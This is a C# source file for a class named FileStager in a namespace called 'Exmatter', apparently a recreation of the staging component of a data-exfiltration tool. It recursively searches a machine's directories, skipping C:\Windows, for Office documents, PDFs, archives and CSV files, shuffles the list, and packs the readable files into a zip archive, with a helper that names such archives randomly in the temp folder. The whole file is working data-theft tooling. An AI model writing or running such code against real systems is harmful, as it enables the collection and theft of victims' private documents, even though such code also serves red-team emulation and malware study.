using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace Exmatter
{
    public class FileStager
    {
        private static readonly List<string> TargetedFileExtensions = new List<string> {
            ".doc",
            ".docx",
            ".xls",
            ".xlsx",
            ".ppt",
            ".pptx",
            ".pdf",
            //".jpg",
            //".jpeg",
            //".png",
            //".bmp",
            ".zip",
            ".rar",
            //".mp3",
            //".mp4",
            //".avi",
            //".txt",
            ".csv",
            //".db",
            //".mdb",
            //".sql",
            //".bak"
        };

        private readonly string _rootDirectory;
        private readonly string _zipFilePath;

        public FileStager(string rootDirectory, string zipFilePath)
        {
            _rootDirectory = rootDirectory;
            _zipFilePath = zipFilePath;
        }

        public string Go()
        {
            var filesToZip = new List<string>();

            // Recursively search for files with targeted extensions
            SearchForFiles(_rootDirectory, filesToZip);

            // Randomize the order of the files before creating the ZIP file
            var random = new Random();
            for (int i = filesToZip.Count - 1; i > 0; i--)
            {
                int j = random.Next(i + 1);
                string temp = filesToZip[i];
                filesToZip[i] = filesToZip[j];
                filesToZip[j] = temp;
            }

            // Create a ZIP file containing all of the files
            CreateZipFile(filesToZip);

            return _zipFilePath;
            
        }

        private void SearchForFiles(string directory, List<string> filesToZip)
        {
            try
            {
                if (directory.Equals("C:\\Windows", StringComparison.OrdinalIgnoreCase))
                {
                    // Skip searching the C:\Windows directory
                    return;
                }

                foreach (string file in Directory.GetFiles(directory))
                {
                    if (TargetedFileExtensions.Contains(Path.GetExtension(file)))
                    {
                        filesToZip.Add(file);
                        //Console.WriteLine($"[+] Adding file \"{file}\"");
                    }
                }

                foreach (string subDirectory in Directory.GetDirectories(directory))
                {
                    SearchForFiles(subDirectory, filesToZip);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error searching directory {directory}: {ex.Message}");
            }
        }
        private string GetRandomString()
        {
            // Write random named zip to Local\Temp\
            string tempFolderPath = Path.GetTempPath();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            string randomString = new string(Enumerable.Repeat(chars, 8)
              .Select(s => s[random.Next(s.Length)]).ToArray());
            string outputFilePath = Path.Combine(tempFolderPath, $"{randomString}.zip");
            
            return outputFilePath;
        }

        private void CreateZipFile(List<string> filesToZip)
        {
            try
            {
                using (var zipArchive = ZipFile.Open(_zipFilePath, ZipArchiveMode.Create))
                {
                    foreach (string file in filesToZip)
                    {
                        // Check if the program has permissions to access the file
                        if (HasFileAccess(file))
                        {
                            zipArchive.CreateEntryFromFile(file, Path.GetFileName(file));
                            Console.WriteLine($"[+] Adding file \"{file}\" to ZIP file");
                        }
                        else
                        {
                            Console.WriteLine($"[!] Program does not have permissions to access file \"{file}\"");
                        }
                    }
                }

                Console.WriteLine($"[+] ZIP file created: {_zipFilePath}");

            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error creating ZIP file: {ex.Message}");
            }
        }


        private bool HasFileAccess(string filePath)
        {
            try
            {
                using (var stream = File.OpenRead(filePath))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
